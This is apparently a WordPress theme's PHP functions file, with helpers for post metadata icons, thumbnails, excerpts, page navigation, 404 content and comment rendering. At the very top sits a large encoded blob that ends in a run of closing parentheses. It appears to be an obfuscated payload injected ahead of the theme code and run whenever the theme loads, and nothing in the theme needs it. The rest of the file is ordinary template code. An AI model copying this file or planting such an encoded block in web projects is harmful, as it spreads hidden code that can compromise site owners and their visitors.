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'))))); 
function theme_include_lib($name){
	if (function_exists('locate_template')){
		locate_template(array('library/'.$name), true);
	} else {
		theme_locate_template(array('library/'.$name), true);
	}
}


if (!function_exists('theme_get_meta_icon')){
	function theme_get_meta_icon($icon, $width, $height){
		return '<img src="'.get_bloginfo('template_url').'/images/'.$icon.'.png" width="'.$width.'" height="'.$height.'" alt="" />';
	}
}

if (!function_exists('theme_get_metadata_icons')){
	function theme_get_metadata_icons($icons = '', $class=''){
		global $post;
		if (!is_string($icons) || mb_strlen($icons) == 0) return;
		$icons = explode(",", str_replace(' ', '', $icons));
		if (!is_array($icons) || count($icons) == 0) return;
		$result = array();
		for($i = 0; $i < count($icons); $i++){
			$icon = $icons[$i];
			switch($icon){
				case 'date':
					$result[] = sprintf( __('<span class="%1$s">Published</span> %2$s', THEME_NS),
									'date',
									sprintf( '<span class="entry-date" title="%1$s">%2$s</span>',
										esc_attr( get_the_time() ),
										get_the_date()
									)
								);
				break;
				case 'author':
					$result[] = sprintf(__('<span class="%1$s">By</span> %2$s', THEME_NS),
									'author',
									sprintf( '<span class="author vcard"><a class="url fn n" href="%1$s" title="%2$s">%3$s</a></span>',
										get_author_posts_url( get_the_author_meta( 'ID' ) ),
										sprintf( esc_attr(__( 'View all posts by %s', THEME_NS )), get_the_author() ),
										get_the_author()
									)
								);
				break;
				case 'category':
					$categories = get_the_category_list(', ');
					if(mb_strlen($categories) == 0) break;
					$result[] = sprintf(__('<span class="%1$s">Posted in</span> %2$s', THEME_NS), 'categories', get_the_category_list(', '));
				break;
				case 'tag':
					$tags_list = get_the_tag_list( '', ', ' );
					if(!$tags_list) break;
					$result[] = sprintf( __( '<span class="%1$s">Tagged</span> %2$s', THEME_NS ), 'tags', $tags_list );
				break;
				case 'comments':
					if(!comments_open()) break;
					ob_start();
					comments_popup_link( __( 'Leave a comment', THEME_NS ), __( '1 Comment', THEME_NS ), __( '% Comments', THEME_NS ) );
					$result[] = ob_get_clean();
				break;
				case 'edit':
					if (!current_user_can('edit_post', $post->ID)) break;
					ob_start();
					edit_post_link(__('Edit', THEME_NS), '');
					$result[] = ob_get_clean();
				break;
			}
		}
		$result = implode(theme_get_option('theme_metadata_separator'), $result);
		if (theme_is_empty_html($result)) return;
		return "<div class=\"art-post{$class}icons art-metadata-icons\">{$result}</div>";
	}
}

if (!function_exists('theme_get_post_thumbnail')){
	function theme_get_post_thumbnail($args = array()){
		global $post;
		
		$size = theme_get_array_value($args, 'size', array(theme_get_option('theme_metadata_thumbnail_width'), theme_get_option('theme_metadata_thumbnail_height')));
		$auto = theme_get_array_value($args, 'auto', theme_get_option('theme_metadata_thumbnail_auto'));
		$featured = theme_get_array_value($args, 'featured', theme_get_option('theme_metadata_use_featured_image_as_thumbnail'));
		$title = theme_get_array_value($args, 'title', get_the_title());

		
		$result = '';

		if ($featured && (function_exists('has_post_thumbnail')) && (has_post_thumbnail())) {
			ob_start();
			the_post_thumbnail($size, array('alt'	=>	'', 'title'	=>	$title));
			$result = ob_get_clean();
		} elseif ($auto) {
			$attachments = get_children(array('post_parent'	=>	$post->ID, 'post_status'	=>	'inherit', 'post_type'	=>	'attachment', 'post_mime_type'	=>	'image', 'order'	=>	'ASC', 'orderby'	=>	'menu_order ID'));
			if($attachments) {
				$attachment = array_shift($attachments);
				$img = wp_get_attachment_image_src($attachment->ID, $size);
				if (isset($img[0])) {
					$result = '<img src="'.$img[0].'" alt="" width="'.$img[1].'" height="'.$img[2].'" title="'.$title.'" class="wp-post-image" />';
				}
			}
		}	
		if($result !== ''){
			$result = '<div class="avatar alignleft"><a href="'.get_permalink($post->ID).'" title="'.$title.'">'.$result.'</a></div>';
		}
		return $result;
	}
}

if (!function_exists('theme_get_content')){
	function theme_get_content($args = array()) {
		$more_tag = theme_get_array_value($args, 'more_tag', __('Continue reading <span class="meta-nav">&rarr;</span>', THEME_NS));
		$content = get_the_content($more_tag);
		// hack for badly written plugins
		ob_start();echo apply_filters('the_content', $content);$content = ob_get_clean();
		return $content . wp_link_pages(array(
		'before' => '<p><span class="page-navi-outer page-navi-caption"><span class="page-navi-inner">' . __('Pages', THEME_NS) . ': </span></span>',
		'after' => '</p>',
		'link_before' => '<span class="page-navi-outer"><span class="page-navi-inner">',
		'link_after' => '</span></span>',
		'echo' => 0
		));
	}
}

if (!function_exists('theme_get_excerpt')){
	function theme_get_excerpt($args = array()) {
		global $post;
		$more_tag = theme_get_array_value($args, 'more_tag', __('Continue reading <span class="meta-nav">&rarr;</span>', THEME_NS));
		$auto = theme_get_array_value($args, 'auto', theme_get_option('theme_metadata_excerpt_auto'));
		$all_words = theme_get_array_value($args, 'all_words', theme_get_option('theme_metadata_excerpt_words'));
		$min_remainder = theme_get_array_value($args, 'min_remainder', theme_get_option('theme_metadata_excerpt_min_remainder'));
		$allowed_tags = theme_get_array_value($args, 'allowed_tags', 
			(theme_get_option('theme_metadata_excerpt_use_tag_filter') 
				? explode(',',str_replace(' ', '', theme_get_option('theme_metadata_excerpt_allowed_tags'))) 
				: null));
		$perma_link = get_permalink($post->ID);
		$more_token = '%%theme_more%%';
		$show_more_tag = false;
		$tag_disbalance = false;
		if (function_exists('post_password_required') && post_password_required($post)){
			return get_the_excerpt();
		}
		if ($auto && has_excerpt($post->ID)) {
			$excerpt = get_the_excerpt();
			$show_more_tag = mb_strlen($post->post_content) > 0;
		} else {
			$excerpt = get_the_content($more_token);
			// hack for badly written plugins
			ob_start();echo apply_filters('get_the_excerpt', $excerpt);$excerpt = ob_get_clean();
			ob_start();echo apply_filters('the_excerpt', $excerpt);$excerpt = ob_get_clean();
			if(theme_is_empty_html($excerpt)) return $excerpt;
			if ($allowed_tags !== null) {
				$allowed_tags = '<' .implode('><',$allowed_tags).'>';
				$excerpt = strip_tags($excerpt, $allowed_tags);
			}
			$excerpt = strip_shortcodes($excerpt);
			if (strpos($excerpt, $more_token) !== false) {
				$excerpt = str_replace($more_token, $more_tag, $excerpt);
			} elseif($auto && is_numeric($all_words)) {
				$token = "%theme_tag_token%";
				$content_parts = explode($token, str_replace(array('<', '>'), array($token.'<', '>'.$token), $excerpt));
				$content = array();
				$word_count = 0;
				foreach($content_parts as $part)
				{
					if (strpos($part, '<') !== false || strpos($part, '>') !== false){
						$content[] = array('type'=>'tag', 'content'=>$part);
					} else {
						$all_chunks = preg_split('/([\s])/u', $part, -1, PREG_SPLIT_DELIM_CAPTURE);
						foreach($all_chunks as $chunk) {
							if('' != trim($chunk)) {
								$content[] = array('type'=>'word', 'content'=>$chunk);
								$word_count += 1;
							} elseif($chunk != '') {
								$content[] = array('type'=>'space', 'content'=>$chunk);
							}
						}
					}
				}

				if(($all_words < $word_count) && ($all_words + $min_remainder) <= $word_count) {
					$show_more_tag = true;
					$tag_disbalance = true;
					$current_count = 0;
					$excerpt = '';
					foreach($content as $node) {
						if($node['type'] == 'word') {
							$current_count++;
						} 
						$excerpt .= $node['content'];
						if ($current_count == $all_words){
							break;
						}
					}
					$excerpt .= '&hellip;'; // ...
				}
			}
		}
		if ($show_more_tag) {
			$excerpt = $excerpt.' <a class="more-link" href="'.$perma_link.'">'.$more_tag.'</a>';
		}
		if ($tag_disbalance) {
			$excerpt = force_balance_tags($excerpt);
		}
		return $excerpt;
	}
}

if (!function_exists('theme_get_search')){
	function theme_get_search(){
		ob_start();
		get_search_form();
		return ob_get_clean();
	}
}


function theme_is_home(){
	return (is_home() && !is_paged());
}


if (!function_exists('theme_404_content')){
	function theme_404_content() {
		$error_message = __( 'Apologies, but the page you requested could not be found. Perhaps searching will help.', THEME_NS);
		theme_post_wrapper(
			array(
					'title' => __('Not Found', THEME_NS),
					'content' => '<p class="center">' 
					. $error_message
					. '</p>' . "\n" . theme_get_search()
			)
		);
		if (theme_get_option('theme_show_random_posts_on_404_page')){
			ob_start(); 
			echo '<h4 class="box-title">' . theme_get_option('theme_show_random_posts_title_on_404_page') . '</h4>'; ?>
			<ul>
				<?php
					global $post;
					$rand_posts = get_posts('numberposts=5&orderby=rand');
					foreach( $rand_posts as $post ) :
				?>
				<li><a href="<?php the_permalink(); ?>"><?php the_title(); ?></a></li>
				<?php endforeach; ?>
			</ul>
			<?php theme_post_wrapper(array('content' => ob_get_clean()));
		}
		if (theme_get_option('theme_show_tags_on_404_page')){
			ob_start();
			echo '<h4 class="box-title">' . theme_get_option('theme_show_tags_title_on_404_page') . '</h4>';
			wp_tag_cloud('smallest=9&largest=22&unit=pt&number=200&format=flat&orderby=name&order=ASC');
			theme_post_wrapper(array('content' => ob_get_clean()));
		}
	}
}

if (!function_exists('theme_page_navigation')){
	function theme_page_navigation($args = '') {
		$args = wp_parse_args($args, array('wrap' => true, 'prev_link' => false, 'next_link' => false));
		$prev_link = $args['prev_link'];
		$next_link = $args['next_link'];
		$wrap = $args['wrap'];
		if (!$prev_link && !$next_link) {
			if (function_exists('wp_page_numbers')) { // http://wordpress.org/extend/plugins/wp-page-numbers/
				ob_start();
				wp_page_numbers();
				theme_post_wrapper(array('content' => ob_get_clean()));
				return;
			} 
			if (function_exists('wp_pagenavi')) { // http://wordpress.org/extend/plugins/wp-pagenavi/
				ob_start();
				wp_pagenavi();
				theme_post_wrapper(array('content' => ob_get_clean()));
				return;
			} 
			//posts
			$prev_link = get_previous_posts_link(__('Newer posts <span class="meta-nav">&rarr;</span>', THEME_NS));
			$next_link = get_next_posts_link(__('<span class="meta-nav">&larr;</span> Older posts', THEME_NS));
		}
		$content = '';
		if ($prev_link || $next_link) {

			$content = <<<EOL
	<div class="navigation">
		<div class="alignleft">{$next_link}</div>
		<div class="alignright">{$prev_link}</div>
	 </div>
EOL;
		}
		if ($wrap) {
			theme_post_wrapper(array('content' => $content));	
		} else {
			echo $content;
		}
	}
}

if (!function_exists('theme_get_previous_post_link')){

	function theme_get_previous_post_link($format='&laquo; %link', $link='%title', $in_same_cat = false, $excluded_categories = '') {
		return theme_get_adjacent_post_link($format, $link, $in_same_cat, $excluded_categories, true);
	}
}

if (!function_exists('theme_get_next_post_link')){
	function theme_get_next_post_link($format='%link &raquo;', $link='%title', $in_same_cat = false, $excluded_categories = '') {
		return theme_get_adjacent_post_link($format, $link, $in_same_cat, $excluded_categories, false);
	}
}

if (!function_exists('theme_get_adjacent_image_link')){
	function theme_get_adjacent_image_link($prev = true, $size = 'thumbnail', $text = false) {
		global $post;
		$post = get_post($post);
		$attachments = array_values(get_children( array('post_parent' => $post->post_parent, 'post_status' => 'inherit', 'post_type' => 'attachment', 'post_mime_type' => 'image', 'order' => 'ASC', 'orderby' => 'menu_order ID') ));

		foreach ( $attachments as $k => $attachment )
			if ( $attachment->ID == $post->ID )
				break;

		$k = $prev ? $k - 1 : $k + 1;

		if ( isset($attachments[$k]) )
			return wp_get_attachment_link($attachments[$k]->ID, $size, true, false, $text);
	}
}

if (!function_exists('theme_get_previous_image_link')){
	function theme_get_previous_image_link($size = 'thumbnail', $text = false) {
		$result = theme_get_adjacent_image_link(true, $size, $text);
		if ($result) $result = '&laquo; ' . $result;
		return $result;
	}
}
	
if (!function_exists('theme_get_next_image_link')){
	function theme_get_next_image_link($size = 'thumbnail', $text = false) {
		$result = theme_get_adjacent_image_link(false, $size, $text);
		if ($result) $result .= ' &raquo;';
		return $result;
	}
}

if (!function_exists('theme_get_adjacent_post_link')){
	function theme_get_adjacent_post_link($format, $link, $in_same_cat = false, $excluded_categories = '', $previous = true) {
		if ( $previous && is_attachment() )
			$post = & get_post($GLOBALS['post']->post_parent);
		else
			$post = get_adjacent_post($in_same_cat, $excluded_categories, $previous);

		if ( !$post )
			return;

		$title = $post->post_title;

		if ( empty($post->post_title) )
			$title = $previous ? __('Previous Post', THEME_NS) : __('Next Post', THEME_NS);

		$title = apply_filters('the_title', $title, $post->ID);
		$short_title = $title;
		if (theme_get_option('theme_single_navigation_trim_title')) {
			$short_title = theme_trim_long_str($title, theme_get_option('theme_single_navigation_trim_len'));
		}
		$date = mysql2date(get_option('date_format'), $post->post_date);
		$rel = $previous ? 'prev' : 'next';

		$string = '<a href="'.get_permalink($post).'" title="'.esc_attr($title).'" rel="'.$rel.'">';
		$link = str_replace('%title', $short_title, $link);
		$link = str_replace('%date', $date, $link);
		$link = $string . $link . '</a>';

		$format = str_replace('%link', $link, $format);

		$adjacent = $previous ? 'previous' : 'next';
		return apply_filters( "{$adjacent}_post_link", $format, $link );
	}
}

if (!function_exists('get_previous_comments_link')) {
	function get_previous_comments_link($label)
	{
		ob_start();
		previous_comments_link($label);
		return ob_get_clean();
	}
}

if (!function_exists('get_next_comments_link')) {
	function get_next_comments_link($label)
	{
		ob_start();
		next_comments_link($label);
		return ob_get_clean();
	}
}

if (!function_exists('theme_comment')){
	function theme_comment( $comment, $args, $depth ) {
		$GLOBALS['comment'] = $comment;
		
		
		switch ( $comment->comment_type ) :
		
			case '' :
		?>
		<li <?php comment_class(); ?> id="li-comment-<?php comment_ID(); ?>">
			<?php ob_start(); ?>
			<div class="comment-author vcard">
				<?php echo theme_get_avatar(array('id' => $comment, 'size' => 48)); ?>
				<?php printf( __( '%s <span class="says">says:</span>', THEME_NS ), sprintf( '<cite class="fn">%s</cite>', get_comment_author_link() ) ); ?>
			</div>
			<?php if ( $comment->comment_approved == '0' ) : ?>
				<em><?php _e( 'Your comment is awaiting moderation.', THEME_NS); ?></em>
				<br />
			<?php endif; ?>

			<div class="comment-meta commentmetadata"><a href="<?php echo esc_url( get_comment_link( $comment->comment_ID ) ); ?>">
				<?php
					printf( __( '%1$s at %2$s', THEME_NS ), get_comment_date(),  get_comment_time() ); ?></a><?php edit_comment_link( __( '(Edit)', THEME_NS), ' ' );
				?>
			</div>

			<div class="comment-body"><?php comment_text(); ?></div>

			<div class="reply">
				<?php comment_reply_link( array_merge( $args, array( 'depth' => $depth, 'max_depth' => $args['max_depth'] ) ) ); ?>
			</div>
			<?php theme_post_wrapper(array('content' => ob_get_clean(), 'id' => 'comment-'.get_comment_ID())); ?>


		<?php
				break;
			case 'pingback'  :
			case 'trackback' :
		?>
		<li class="post pingback">
		<?php ob_start(); ?>
			<p><?php _e( 'Pingback:', THEME_NS ); ?> <?php comment_author_link(); ?><?php edit_comment_link( __('(Edit)', THEME_NS), ' ' ); ?></p>
		<?php theme_post_wrapper(array('content' => ob_get_clean(), 'class' => $comment->comment_type));
				break;
		endswitch;
	}
}

